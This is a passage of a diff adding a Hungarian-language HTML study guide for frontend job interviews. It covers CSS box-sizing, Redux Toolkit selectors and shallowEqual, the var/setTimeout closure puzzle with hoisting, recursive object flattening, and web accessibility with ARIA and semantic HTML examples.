+  │  │  │  │   156px       │  │  │  │
+  │  │  │  └───────────────┘  │  │  │
+  │  │  └─────────────────────┘  │  │
+  │  └───────────────────────────┘  │
+  └─────────────────────────────────┘
+
+  Teljes szélesség = 200px (border + padding BELESZÁMÍT)
+  A width az EGÉSZ dobozra vonatkozik!
+*/</code></pre>
+
+<h3>10.2 Példa</h3>
+<pre><code>/* content-box (alapértelmezett) */
+.box-content {
+  box-sizing: content-box;
+  width: 200px;
+  padding: 20px;
+  border: 2px solid black;
+  /* Tényleges szélesség: 200 + 40 + 4 = 244px */
+}
+
+/* border-box */
+.box-border {
+  box-sizing: border-box;
+  width: 200px;
+  padding: 20px;
+  border: 2px solid black;
+  /* Tényleges szélesség: 200px (content automatikusan 156px lesz) */
+}</code></pre>
+
+<h3>10.3 A "universal" reset – minden projektben ajánlott</h3>
+<pre><code>/* A legelterjedtebb CSS reset erre: */
+*, *::before, *::after {
+  box-sizing: border-box;
+}
+
+/* Miért? Mert a border-box intuitívabb:
+   Ha azt mondod width: 50%, az TÉNYLEG 50% lesz,
+   nem 50% + padding + border */</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> Szinte minden modern CSS framework (Tailwind, Bootstrap, Normalize.css) alapértelmezetten <code>border-box</code>-ot használ. A <code>content-box</code> a CSS specifikáció alapértelmezése, de a gyakorlatban szinte mindig felülírjuk.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 11. REDUX TOOLKIT: extraReducers, useSelector, shallowEqual -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q11">
+<h2>11. Redux Toolkit: extraReducers, useSelector, shallowEqual</h2>
+<span class="tag">React</span> <span class="tag">Redux</span>
+
+<p>A <strong>Redux Toolkit (RTK)</strong> a Redux hivatalos, ajánlott módja az állapotkezelésnek. A "klasszikus" Redux-hoz képest drasztikusan csökkenti a boilerplate kódot: a <code class="inline-code">createSlice</code> automatikusan generálja az action creator-öket és action type-okat, az <strong>Immer</strong> library segítségével "mutálhatjuk" a state-et (a háttérben immutable marad), és a <code class="inline-code">createAsyncThunk</code> egységesíti az aszinkron logikát.</p>
+
+<h3>11.1 createSlice és extraReducers</h3>
+<p>A <code class="inline-code">reducers</code> mezőben az adott slice <strong>saját szinkron</strong> action-jeit definiáljuk – az RTK automatikusan létrehozza hozzájuk az action creator-öket és a type string-eket. Az <code class="inline-code">extraReducers</code>-ben <strong>más slice-ok vagy asyncThunk-ok</strong> action-jeire reagálunk. A <code>builder</code> mintás API típusbiztos és jól olvasható.</p>
+
+<pre><code>import { createSlice, createAsyncThunk } from "@reduxjs/toolkit";
+
+// Async thunk – API hívás
+export const fetchUsers = createAsyncThunk(
+  "users/fetchAll",
+  async (_, { rejectWithValue }) => {
+    try {
+      const res = await fetch("/api/users");
+      if (!res.ok) throw new Error("Hiba");
+      return await res.json();
+    } catch (err) {
+      return rejectWithValue(err.message);
+    }
+  }
+);
+
+const usersSlice = createSlice({
+  name: "users",
+  initialState: {
+    list: [],
+    loading: false,
+    error: null,
+  },
+
+  // Saját (szinkron) action-ök
+  reducers: {
+    addUser(state, action) {
+      state.list.push(action.payload); // Immer – mutálhatjuk!
+    },
+    removeUser(state, action) {
+      state.list = state.list.filter(u => u.id !== action.payload);
+    },
+  },
+
+  // Külső action-ökre reagálás (pl. asyncThunk)
+  extraReducers: (builder) => {
+    builder
+      .addCase(fetchUsers.pending, (state) => {
+        state.loading = true;
+        state.error = null;
+      })
+      .addCase(fetchUsers.fulfilled, (state, action) => {
+        state.loading = false;
+        state.list = action.payload;
+      })
+      .addCase(fetchUsers.rejected, (state, action) => {
+        state.loading = false;
+        state.error = action.payload;
+      });
+  },
+});
+
+export const { addUser, removeUser } = usersSlice.actions;
+export default usersSlice.reducer;</code></pre>
+
+<h3>11.2 useSelector – state olvasása</h3>
+<p>A <code class="inline-code">useSelector</code> hook a Redux store-ból olvassa ki a szükséges adatot. Egy szelektor függvényt kap, ami a teljes state-et kapja paraméterként és visszaadja a kívánt "szeletet". A komponens <strong>újrarenderel</strong>, ha a szelektor visszatérési értéke <strong>megváltozik</strong> (alapértelmezetten <code>===</code> összehasonlítással).</p>
+<pre><code>import { useSelector, useDispatch } from "react-redux";
+import { fetchUsers, removeUser } from "./usersSlice";
+
+function UserList() {
+  const dispatch = useDispatch();
+
+  // useSelector – kiválasztja a szükséges részt a store-ból
+  const users = useSelector((state) => state.users.list);
+  const loading = useSelector((state) => state.users.loading);
+  const error = useSelector((state) => state.users.error);
+
+  useEffect(() => {
+    dispatch(fetchUsers());
+  }, [dispatch]);
+
+  if (loading) return &lt;p&gt;Betöltés...&lt;/p&gt;;
+  if (error) return &lt;p&gt;Hiba: {error}&lt;/p&gt;;
+
+  return (
+    &lt;ul&gt;
+      {users.map(user =&gt; (
+        &lt;li key={user.id}&gt;
+          {user.name}
+          &lt;button onClick={() =&gt; dispatch(removeUser(user.id))}&gt;Törlés&lt;/button&gt;
+        &lt;/li&gt;
+      ))}
+    &lt;/ul&gt;
+  );
+}</code></pre>
+
+<h3>11.3 A probléma: felesleges újrarenderelés</h3>
+<p>A <code class="inline-code">useSelector</code> alapértelmezetten <strong>strict equality (===)</strong> összehasonlítást használ. Ha a szelektorfüggvény minden futásnál <strong>új referenciát</strong> ad vissza (pl. <code>.filter()</code>, <code>.map()</code>, vagy objektum literál), a komponens MINDIG újrarenderel!</p>
+
+<pre><code>// ❌ ROSSZ – minden rendereléskor új tömb referencia jön létre
+const activeUsers = useSelector(state =>
+  state.users.list.filter(u => u.active)
+);
+// Ez MINDIG újrarenderel, még ha az eredmény ugyanaz is!
+
+// ❌ ROSSZ – minden rendereléskor új objektum referencia
+const userInfo = useSelector(state => ({
+  names: state.users.list.map(u => u.name),
+  count: state.users.list.length,
+}));
+// Ez is MINDIG újrarenderel!</code></pre>
+
+<h3>11.4 shallowEqual – a megoldás</h3>
+<p>A <code class="inline-code">useSelector</code> második paramétereként megadhatunk egy <strong>összehasonlító függvényt</strong>. A <code class="inline-code">shallowEqual</code> (react-redux beépített) az objektum/tömb <strong>első szintjén</strong> hasonlítja össze az értékeket, nem referencia alapján. Így ha a szelektor új objektumot ad vissza, de az értékei megegyeznek az előzőével, a komponens <strong>nem renderel újra</strong>.</p>
+<pre><code>import { useSelector, shallowEqual } from "react-redux";
+
+// ✅ JÓ – shallowEqual összehasonlítja az objektum/tömb ELSŐ SZINTJÉT
+const userInfo = useSelector(
+  (state) => ({
+    names: state.users.list.map(u => u.name),
+    count: state.users.list.length,
+  }),
+  shallowEqual  // 2. paraméter: összehasonlító függvény
+);
+// Csak akkor renderel újra, ha names vagy count ténylegesen VÁLTOZOTT
+
+// ✅ Tömböknél is hasznos
+const activeUsers = useSelector(
+  (state) => state.users.list.filter(u => u.active),
+  shallowEqual
+);</code></pre>
+
+<h3>11.5 Hogyan működik a shallowEqual?</h3>
+<pre><code>// Shallow comparison – CSAK az első szintet hasonlítja:
+function shallowEqual(objA, objB) {
+  if (objA === objB) return true; // Ugyanaz a referencia
+
+  const keysA = Object.keys(objA);
+  const keysB = Object.keys(objB);
+
+  if (keysA.length !== keysB.length) return false;
+
+  return keysA.every(key => objA[key] === objB[key]); // Csak 1. szint!
+}
+
+// Példa:
+shallowEqual({ a: 1, b: 2 }, { a: 1, b: 2 });       // true ✅
+shallowEqual({ a: 1, b: 2 }, { a: 1, b: 3 });       // false
+shallowEqual({ a: [1,2] },   { a: [1,2] });          // false ❌ – [1,2] !== [1,2]</code></pre>
+
+<h3>11.6 Alternatív megoldások</h3>
+<pre><code>// 1. createSelector (memoizált szelektor – Reselect)
+import { createSelector } from "@reduxjs/toolkit";
+
+const selectActiveUsers = createSelector(
+  [(state) => state.users.list],         // input szelektorok
+  (users) => users.filter(u => u.active) // csak ha users változik, fut le
+);
+
+// Használat:
+const activeUsers = useSelector(selectActiveUsers); // shallowEqual nem kell!
+
+// 2. Több egyszerű useSelector (szétbontás)
+const count = useSelector(state => state.users.list.length);  // primitív → === elég
+const loading = useSelector(state => state.users.loading);    // primitív → === elég</code></pre>
+
+<h3>11.7 RTK Query – beépített data fetching</h3>
+<p>Az RTK tartalmaz egy beépített <strong>data fetching és caching megoldást</strong> is: az <strong>RTK Query</strong>-t. Ez kiváltja a manuális <code>createAsyncThunk</code> + loading/error state kezelést, és automatikus cache-elést, újravalidálást, polling-ot és optimistic update-eket biztosít. Hasonló a <code>React Query</code>-hez (TanStack Query), de a Redux ökoszisztémába integrálva.</p>
+
+<pre><code>import { createApi, fetchBaseQuery } from "@reduxjs/toolkit/query/react";
+
+// API slice definiálása
+const usersApi = createApi({
+  reducerPath: "usersApi",
+  baseQuery: fetchBaseQuery({ baseUrl: "/api" }),
+  tagTypes: ["User"],
+  endpoints: (builder) => ({
+    // GET /api/users
+    getUsers: builder.query({
+      query: () => "/users",
+      providesTags: ["User"],
+    }),
+    // POST /api/users
+    addUser: builder.mutation({
+      query: (newUser) => ({
+        url: "/users",
+        method: "POST",
+        body: newUser,
+      }),
+      invalidatesTags: ["User"], // Automatikus refetch a getUsers-nek!
+    }),
+  }),
+});
+
+// Automatikusan generált hookok:
+export const { useGetUsersQuery, useAddUserMutation } = usersApi;
+
+// Használat komponensben:
+function UserList() {
+  const { data: users, isLoading, error } = useGetUsersQuery();
+  const [addUser] = useAddUserMutation();
+
+  if (isLoading) return &lt;p&gt;Betöltés...&lt;/p&gt;;
+  // Nincs szükség manuális loading/error state-re!
+}</code></pre>
+
+<div class="note">
+  <strong>Összefoglalás:</strong>
+  <ul>
+    <li><code>extraReducers</code> – más slice-ok / asyncThunk-ok action-jeire reagálás</li>
+    <li><code>useSelector</code> – state olvasása, alapértelmezetten <code>===</code> összehasonlítás</li>
+    <li><code>shallowEqual</code> – ha a szelektor objektumot/tömböt ad vissza, elkerüli a felesleges renderelést</li>
+    <li><code>createSelector</code> – memoizált szelektor, a legjobb megoldás komplex szelekcióknál</li>
+    <li><code>RTK Query</code> – beépített data fetching, cache, auto-refetch – kiváltja a manuális thunk-okat</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 12. GYAKORLATI FELADAT: var + setTimeout CLOSURE PROBLÉMA -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q12">
+<h2>12. Gyakorlati feladat: var + setTimeout closure</h2>
+<span class="tag">JS alapok</span> <span class="tag">Closure</span> <span class="tag">Event Loop</span>
+
+<p>Ez az egyik <strong>legklasszikusabb</strong> JavaScript interjúkérdés. Három fontos koncepciót tesztel egyszerre: a <strong>var vs let scoping</strong> különbséget, a <strong>closure</strong> mechanizmust, és az <strong>event loop</strong> működését. Ha ezt jól el tudod magyarázni, az erős alapokat mutat.</p>
+
+<h3>12.1 A feladat</h3>
+<pre><code>for (var i = 0; i < 6; i++) {
+  setTimeout(() => console.log(i), 1000);
+}
+
+// Mi lesz a kimenet?</code></pre>
+
+<h3>12.2 Válasz: 6-szor kiírja hogy 6</h3>
+<pre><code>// Kimenet (1 mp után, egyszerre):
+// 6
+// 6
+// 6
+// 6
+// 6
+// 6</code></pre>
+
+<h3>12.3 Miért?</h3>
+<p>A <code class="inline-code">var</code> <strong>function-scoped</strong> (nem block-scoped!), tehát egyetlen <code>i</code> változó létezik az egész ciklus során. Mire a <code>setTimeout</code> callback-ek lefutnak (1 mp múlva), a ciklus már befejeződött és <code>i === 6</code>.</p>
+
+<pre><code>/*
+  Lépésről lépésre:
+
+  1. iteráció: i=0, setTimeout regisztrálva (callback még NEM fut)
+  2. iteráció: i=1, setTimeout regisztrálva
+  3. iteráció: i=2, setTimeout regisztrálva
+  4. iteráció: i=3, setTimeout regisztrálva
+  5. iteráció: i=4, setTimeout regisztrálva
+  6. iteráció: i=5, setTimeout regisztrálva
+  7. i++ → i=6, feltétel i<6 HAMIS → ciklus vége
+
+  ... 1 mp telik el ...
+
+  Callback-ek lefutnak: mindegyik ugyanazt az "i" változót olvassa → 6
+*/</code></pre>
+
+<h3>12.4 Megoldások</h3>
+
+<pre><code>// ✅ 1. MEGOLDÁS: let (block-scoped – minden iterációhoz saját "i")
+for (let i = 0; i < 6; i++) {
+  setTimeout(() => console.log(i), 1000);
+}
+// Kimenet: 0, 1, 2, 3, 4, 5
+// Miért? A "let" minden iterációban SAJÁT változót hoz létre!</code></pre>
+
+<pre><code>// ✅ 2. MEGOLDÁS: IIFE (Immediately Invoked Function Expression)
+for (var i = 0; i < 6; i++) {
+  (function(j) {
+    setTimeout(() => console.log(j), 1000);
+  })(i); // Az aktuális "i" értéket átadjuk "j"-ként
+}
+// A függvény SAJÁT scope-ot hoz létre, "j" ott ragad az aktuális értékkel</code></pre>
+
+<pre><code>// ✅ 3. MEGOLDÁS: setTimeout 3. paramétere (kevésbé ismert!)
+for (var i = 0; i < 6; i++) {
+  setTimeout((j) => console.log(j), 1000, i);
+  //                                      ↑ extra paraméter → a callback első argumentuma lesz
+}</code></pre>
+
+<pre><code>// ✅ 4. MEGOLDÁS: .bind()
+for (var i = 0; i < 6; i++) {
+  setTimeout(console.log.bind(console, i), 1000);
+}</code></pre>
+
+<h3>12.5 Kapcsolódó: Hoisting és Temporal Dead Zone (TDZ)</h3>
+<p>A <code class="inline-code">var</code> és <code class="inline-code">let</code>/<code class="inline-code">const</code> közötti különbség a scope-on túl a <strong>hoisting</strong> viselkedésben is megmutatkozik. Mindhárom kulcsszó hoisting-olt (a deklaráció a scope elejére "emelkedik"), de eltérően:</p>
+
+<pre><code>// VAR hoisting – deklaráció ÉS inicializáció (undefined-dal) is felemelődik
+console.log(x); // undefined – NEM ReferenceError!
+var x = 5;
+// A motor így látja:
+// var x = undefined;   ← hoisted
+// console.log(x);
+// x = 5;
+
+// LET/CONST hoisting – deklaráció felemelődik, DE inicializáció NEM
+console.log(y); // ReferenceError: Cannot access 'y' before initialization
+let y = 5;
+// A "let y" deklaráció hoisting-olt, de a TDZ-ben van a blokk elejétől
+// a deklaráció soráig – ebben a zónában nem elérhető.
+
+// TDZ (Temporal Dead Zone) – a blokk eleje és a deklaráció közötti terület:
+{
+  // ── TDZ kezdete a "z" változóra ──
+  console.log(typeof z); // ReferenceError! (typeof sem menti meg!)
+  // ── TDZ vége ──
+  let z = 10;
+  console.log(z);        // 10
+}
+
+// var vs let/const összefoglaló:
+//                var          let          const
+// Scope:        function     block        block
+// Hoisting:     igen+init    igen (TDZ)   igen (TDZ)
+// Újradeklarálás: igen       nem          nem
+// Újraírás:     igen         igen         nem (de objektum belül módosítható!)
+
+const arr = [1, 2, 3];
+arr.push(4);       // ✅ Ez működik! A referencia nem változik.
+arr = [5, 6, 7];   // ❌ TypeError – a referencia nem írható felül.</code></pre>
+
+<div class="note">
+  <strong>Kulcsszavak az interjúra:</strong>
+  <ul>
+    <li><code>var</code> = function-scoped + hoisting undefined-dal, <code>let/const</code> = block-scoped + TDZ</li>
+    <li><strong>Closure</strong> – a callback "bezárja" a változó <em>referenciáját</em>, nem az <em>értékét</em></li>
+    <li><strong>Event loop</strong> – a setTimeout callback-ek a <strong>macrotask queue</strong>-ba kerülnek, csak a szinkron kód (ciklus) lefutása UTÁN hajtódnak végre</li>
+    <li><strong>TDZ</strong> – a <code>let/const</code> deklaráció a scope elejétől a tényleges sorukig "holt zónában" vannak</li>
+  </ul>
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 13. GYAKORLATI FELADAT: OBJEKTUM LAPOSÍTÁSA (FLATTEN) -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q13">
+<h2>13. Gyakorlati feladat: Objektum laposítása (flatten)</h2>
+<span class="tag">JS alapok</span> <span class="tag">Rekurzió</span>
+
+<p>Ez egy tipikus <strong>live coding</strong> feladat, ami a rekurzív gondolkodást, a <code class="inline-code">typeof</code> operátor ismeretét és az objektumok bejárásának képességét teszteli. A megoldás lényege: végigmegyünk az objektum kulcsain, és ha egy érték objektum (nem primitív), rekurzívan meghívjuk a függvényt a ponttal összefűzött kulccsal.</p>
+
+<h3>13.1 A feladat</h3>
+<pre><code>// Bemenet:
+const obj = {
+  a: {
+    b: {
+      c: {
+        d: "123"
+      }
+    }
+  },
+  e: "xyz"
+};
+
+// Elvárt kimenet:
+// { "a.b.c.d": "123", "e": "xyz" }</code></pre>
+
+<h3>13.2 Megoldás: rekurzív flatten</h3>
+<p>A <strong>rekurzió</strong> azt jelenti, hogy a függvény önmagát hívja meg, amíg el nem ér egy alap-esetet (base case). Itt az alap-eset: ha az érték primitív (nem objektum), akkor hozzáadjuk az eredményhez. A rekurzív eset: ha az érték objektum, "lemegyünk egy szinttel mélyebbre" és az összes kulcsát feldolgozzuk.</p>
+<pre><code>function flattenObject(obj, prefix = "", result = {}) {
+  for (const key in obj) {
+    if (!obj.hasOwnProperty(key)) continue;
+
+    const newKey = prefix ? `${prefix}.${key}` : key;
+    const value = obj[key];
+
+    if (typeof value === "object" && value !== null && !Array.isArray(value)) {
+      // Beágyazott objektum → rekurzív hívás
+      flattenObject(value, newKey, result);
+    } else {
+      // Primitív érték (vagy tömb) → hozzáadjuk az eredményhez
+      result[newKey] = value;
+    }
+  }
+  return result;
+}
+
+// Teszt
+const obj = {
+  a: { b: { c: { d: "123" } } },
+  e: "xyz"
+};
+
+console.log(flattenObject(obj));
+// { "a.b.c.d": "123", "e": "xyz" }</code></pre>
+
+<h3>13.3 Lépésről lépésre végigjárás</h3>
+<pre><code>/*
+  flattenObject({ a: { b: { c: { d: "123" } } }, e: "xyz" }, "")
+
+  1. key="a", newKey="a", value={ b: { c: { d: "123" } } }
+     → objektum → rekurzív hívás: flattenObject(value, "a")
+
+     2. key="b", newKey="a.b", value={ c: { d: "123" } }
+        → objektum → rekurzív hívás: flattenObject(value, "a.b")
+
+        3. key="c", newKey="a.b.c", value={ d: "123" }
+           → objektum → rekurzív hívás: flattenObject(value, "a.b.c")
+
+           4. key="d", newKey="a.b.c.d", value="123"
+              → PRIMITÍV → result["a.b.c.d"] = "123"
+
+  5. key="e", newKey="e", value="xyz"
+     → PRIMITÍV → result["e"] = "xyz"
+
+  Eredmény: { "a.b.c.d": "123", "e": "xyz" }
+*/</code></pre>
+
+<h3>13.4 Kibővített verzió (tömb + null kezelés)</h3>
+<pre><code>function flattenObject(obj, prefix = "", result = {}) {
+  for (const [key, value] of Object.entries(obj)) {
+    const newKey = prefix ? `${prefix}.${key}` : key;
+
+    if (value && typeof value === "object" && !Array.isArray(value)) {
+      flattenObject(value, newKey, result);
+    } else {
+      result[newKey] = value;
+    }
+  }
+  return result;
+}
+
+// Komplexebb teszt:
+console.log(flattenObject({
+  user: {
+    name: { first: "Anna", last: "Kiss" },
+    age: 28,
+    hobbies: ["reading", "coding"], // tömb – nem laposítjuk
+    address: null                     // null – primitívként kezeljük
+  },
+  active: true
+}));
+// {
+//   "user.name.first": "Anna",
+//   "user.name.last": "Kiss",
+//   "user.age": 28,
+//   "user.hobbies": ["reading", "coding"],
+//   "user.address": null,
+//   "active": true
+// }</code></pre>
+
+<h3>13.5 Fordított irány: unflatten</h3>
+<pre><code>function unflattenObject(obj) {
+  const result = {};
+
+  for (const [flatKey, value] of Object.entries(obj)) {
+    const keys = flatKey.split(".");
+    let current = result;
+
+    keys.forEach((key, index) => {
+      if (index === keys.length - 1) {
+        current[key] = value; // Utolsó kulcs → értéket rendeljük
+      } else {
+        current[key] = current[key] || {}; // Köztes kulcs → objektum
+        current = current[key];
+      }
+    });
+  }
+
+  return result;
+}
+
+console.log(unflattenObject({ "a.b.c.d": "123", "e": "xyz" }));
+// { a: { b: { c: { d: "123" } } }, e: "xyz" }</code></pre>
+
+<h3>13.6 Tipikus csapdák és edge case-ek</h3>
+<p>Az interjún érdemes proaktívan megemlíteni az edge case-eket – ez mutatja, hogy a valós fejlesztésben is gondolkodsz:</p>
+
+<pre><code>// 1. typeof null === "object" – a JavaScript legismertebb "baja"
+console.log(typeof null);       // "object" – de NEM az!
+console.log(typeof undefined);  // "undefined"
+console.log(typeof []);         // "object" – a tömb IS objektum!
+// Ezért kell: value !== null && !Array.isArray(value)
+
+// 2. Cirkuláris referencia → végtelen rekurzió → Stack Overflow!
+const a = {};
+a.self = a; // cirkuláris!
+// flattenObject(a) → RangeError: Maximum call stack size exceeded
+
+// Védelem: Set-tel nyomon követjük a már látott objektumokat
+function safeFlatten(obj, prefix = "", result = {}, seen = new Set()) {
+  if (seen.has(obj)) return result; // Cirkuláris → kihagyjuk
+  seen.add(obj);
+
+  for (const [key, value] of Object.entries(obj)) {
+    const newKey = prefix ? `${prefix}.${key}` : key;
+    if (value && typeof value === "object" && !Array.isArray(value)) {
+      safeFlatten(value, newKey, result, seen);
+    } else {
+      result[newKey] = value;
+    }
+  }
+  return result;
+}
+
+// 3. Nagyon mélyen beágyazott objektum → stack overflow
+// Megoldás: iteratív (nem rekurzív) megközelítés stack-kel</code></pre>
+
+<div class="note">
+  <strong>Interjú tipp:</strong> Ez a feladat a <strong>rekurzió</strong>, <strong>typeof ellenőrzés</strong> és <strong>referencia vs érték</strong> megértését teszteli. Mindig emeld ki a <code>null</code> kezelést (<code>typeof null === "object"</code>!) és kérdezz rá a cirkuláris referencia kezelésére – ez mutatja a tapasztalatot.
+</div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<!-- 14. WEB ACCESSIBILITY (a11y) -->
+<!-- ═══════════════════════════════════════════════════════════════════ -->
+<div class="section" id="q14">
+<h2>14. Web Accessibility (a11y)</h2>
+<span class="tag">a11y</span> <span class="tag">HTML</span>
+
+<h3>14.1 Mi az a Web Accessibility?</h3>
+<p>Az akadálymentes web azt jelenti, hogy az oldalt <strong>mindenki</strong> tudja használni – beleértve a látás-, hallás-, mozgás- vagy kognitív fogyatékossággal élő személyeket. A <strong>WCAG (Web Content Accessibility Guidelines)</strong> szabvány 3 szintet definiál: <strong>A</strong> (minimum), <strong>AA</strong> (ajánlott), <strong>AAA</strong> (ideális).</p>
+
+<p>Az accessibility nem csak "jó szándék" kérdése – sok országban <strong>jogi követelmény</strong> (EU: European Accessibility Act 2025, USA: ADA, Section 508). A WCAG 4 alapelvre épül (<strong>POUR</strong>): <strong>P</strong>erceivable (észlelhető), <strong>O</strong>perable (működtethető), <strong>U</strong>nderstandable (érthető), <strong>R</strong>obust (robosztus).</p>
+
+<h3>14.2 Szemantikus HTML – az a11y alapja</h3>
+<p>A szemantikus HTML elemek (<code class="inline-code">&lt;header&gt;</code>, <code class="inline-code">&lt;nav&gt;</code>, <code class="inline-code">&lt;main&gt;</code>, <code class="inline-code">&lt;article&gt;</code>, <code class="inline-code">&lt;aside&gt;</code>, <code class="inline-code">&lt;footer&gt;</code>) automatikusan <strong>ARIA landmark role-okat</strong> kapnak, amelyek segítenek a screen reader felhasználóknak az oldal struktúrájában navigálni. Ezeket <strong>nem kell</strong> manuálisan ARIA-val jelölni – a natív HTML elemek önmagukban biztosítják.</p>
+<pre><code>&lt;!-- ❌ ROSSZ – nem szemantikus --&gt;
+&lt;div class="header"&gt;
+  &lt;div class="nav"&gt;
+    &lt;div class="nav-item" onclick="goHome()"&gt;Főoldal&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="main"&gt;
+  &lt;div class="article"&gt;
+    &lt;div class="title"&gt;Cím&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class="footer"&gt;Lábléc&lt;/div&gt;
+
+&lt;!-- ✅ JÓ – szemantikus --&gt;
+&lt;header&gt;
+  &lt;nav aria-label="Fő navigáció"&gt;
+    &lt;a href="/"&gt;Főoldal&lt;/a&gt;
+  &lt;/nav&gt;
+&lt;/header&gt;
+&lt;main&gt;
+  &lt;article&gt;
+    &lt;h1&gt;Cím&lt;/h1&gt;
+  &lt;/article&gt;
+&lt;/main&gt;
+&lt;footer&gt;Lábléc&lt;/footer&gt;</code></pre>
+
+<h3>14.3 ARIA attribútumok</h3>
+<p>Az <strong>ARIA (Accessible Rich Internet Applications)</strong> attribútumok extra információt adnak a screen readereknek, ha a HTML elemek önmagukban nem elégségesek.</p>
+<pre><code>&lt;!-- aria-label: Láthatatlan felirat screen readereknek --&gt;
+&lt;button aria-label="Menü bezárása"&gt;✕&lt;/button&gt;
+
+&lt;!-- aria-labelledby: Másik elem szövegéből veszi a címkét --&gt;
+&lt;h2 id="section-title"&gt;Termékek&lt;/h2&gt;
+&lt;ul aria-labelledby="section-title"&gt;
+  &lt;li&gt;Termék 1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;!-- aria-describedby: Kiegészítő leírás --&gt;
+&lt;input type="password" aria-describedby="pw-hint" /&gt;
+&lt;p id="pw-hint"&gt;Minimum 8 karakter, legalább 1 szám.&lt;/p&gt;
+
+&lt;!-- aria-live: Dinamikus tartalom bejelentése --&gt;
+&lt;div aria-live="polite"&gt;3 új üzenet érkezett&lt;/div&gt;
+&lt;!-- "polite" = megvárja míg a felhasználó befejezi amit csinál --&gt;
+&lt;!-- "assertive" = azonnal felolvassa (sürgős hibaüzenetek) --&gt;
+
+&lt;!-- aria-hidden: Elrejti a screen reader elől --&gt;
+&lt;span aria-hidden="true"&gt;🎉&lt;/span&gt;
+
+&lt;!-- role: Elem szerepének felülírása --&gt;
+&lt;div role="alert"&gt;Hiba történt a mentésnél!&lt;/div&gt;
+&lt;div role="dialog" aria-modal="true" aria-labelledby="dialog-title"&gt;
+  &lt;h2 id="dialog-title"&gt;Biztosan törlöd?&lt;/h2&gt;
+&lt;/div&gt;</code></pre>
+
+<div class="warning">
+  <strong>Fontos szabály:</strong> ARIA csak akkor szükséges, ha a natív HTML elemek nem elegendők. <em>"No ARIA is better than bad ARIA."</em> – Inkább használj <code>&lt;button&gt;</code>-t mint <code>&lt;div role="button"&gt;</code>-t!
+</div>
+
+<h3>14.4 Billentyűzet navigáció</h3>
+<pre><code>&lt;!-- ❌ ROSSZ – div nem fókuszálható, Enter/Space nem működik --&gt;
+&lt;div class="btn" onclick="submit()"&gt;Küldés&lt;/div&gt;
+
+&lt;!-- ✅ JÓ – natív button, automatikus billentyűzet támogatás --&gt;
+&lt;button onclick="submit()"&gt;Küldés&lt;/button&gt;
+
+&lt;!-- Ha mégis div kell (pl. egyedi komponens): --&gt;
+&lt;div
+  role="button"
+  tabindex="0"
+  onclick="submit()"
+  onkeydown="if(event.key==='Enter'||event.key===' ') submit()"
+&gt;
+  Küldés
+&lt;/div&gt;
+
+&lt;!-- tabindex értékek: --&gt;
+&lt;!-- tabindex="0"  → a normál tab sorrendbe kerül --&gt;
+&lt;!-- tabindex="-1" → programozottan fókuszálható, de TAB-bal nem --&gt;
+&lt;!-- tabindex="1+" → KERÜLENDŐ – felborítja a természetes sorrendet --&gt;</code></pre>
+
+<h3>14.5 Képek és alt szöveg</h3>
+<pre><code>&lt;!-- Informatív kép – leírja mit ábrázol --&gt;
+&lt;img src="chart.png" alt="Eladási adatok 2024 Q3 – 15%-os növekedés" /&gt;
+
+&lt;!-- Dekoratív kép – üres alt (screen reader kihagyja) --&gt;
+&lt;img src="divider.png" alt="" /&gt;
+
+&lt;!-- Komplex kép – részletes leírás --&gt;
+&lt;figure&gt;
+  &lt;img src="architecture.png" alt="Rendszer architektúra diagram" aria-describedby="arch-desc" /&gt;
+  &lt;figcaption id="arch-desc"&gt;
+    A frontend React alkalmazás API Gateway-en keresztül kommunikál
+    a backend mikroszolgáltatásokkal...
+  &lt;/figcaption&gt;
+&lt;/figure&gt;</code></pre>
+
+<h3>14.6 Szín és kontraszt</h3>
+<pre><code>/* WCAG AA követelmény:
+   - Normál szöveg: minimum 4.5:1 kontraszt arány
+   - Nagy szöveg (18px+ bold, 24px+): minimum 3:1
+   - UI elemek (gombok, inputok): minimum 3:1
+
+   Eszközök: Chrome DevTools → Lighthouse, axe DevTools, WAVE
+*/
+
+/* ❌ ROSSZ – gyenge kontraszt */
+.error { color: #ff9999; background: #fff; } /* ~2:1 arány */
+
+/* ✅ JÓ – megfelelő kontraszt */
+.error { color: #d32f2f; background: #fff; } /* ~5.5:1 arány */
+
+/* Ne csak színnel jelölj állapotot (a színvak felhasználók nem látják)! */
+/* ❌ ROSSZ – KIZÁRÓLAG szín jelzi a hibát: */
+.error { color: red; }
+
+/* ✅ JÓ – szín + ikon/szöveg is jelzi (redundáns jelzés): */
+.error { color: #d32f2f; }
+.error::before { content: "⚠ "; }</code></pre>
+
+<h3>14.7 Form accessibility</h3>
+<pre><code>&lt;!-- ❌ ROSSZ – nincs label összerendelés --&gt;
+&lt;span&gt;Email:&lt;/span&gt;
+&lt;input type="email" /&gt;
+
+&lt;!-- ✅ JÓ – explicit label --&gt;
+&lt;label for="email"&gt;Email:&lt;/label&gt;
+&lt;input id="email" type="email" required aria-required="true" /&gt;
+
+&lt;!-- ✅ JÓ – implicit label (input a label belsejében) --&gt;
+&lt;label&gt;
+  Email:
+  &lt;input type="email" required /&gt;
+&lt;/label&gt;
+
+&lt;!-- Hiba jelzés --&gt;
+&lt;label for="pw"&gt;Jelszó:&lt;/label&gt;
+&lt;input id="pw" type="password" aria-invalid="true" aria-describedby="pw-error" /&gt;
+&lt;p id="pw-error" role="alert"&gt;A jelszó túl rövid!&lt;/p&gt;</code></pre>
+
+<h3>14.8 Skip to content link</h3>
+<p>A "skip to content" link az oldal legelső fókuszálható eleme, ami lehetővé teszi a billentyűzet-felhasználóknak, hogy <strong>átugorják a navigációt</strong> és egyből a fő tartalomra ugorjanak. Vizuálisan rejtett, de TAB-bal előhozható.</p>
+
+<pre><code>&lt;!-- Az oldal tetejére, a body első elemeként: --&gt;
+&lt;a href="#main-content" class="skip-link"&gt;
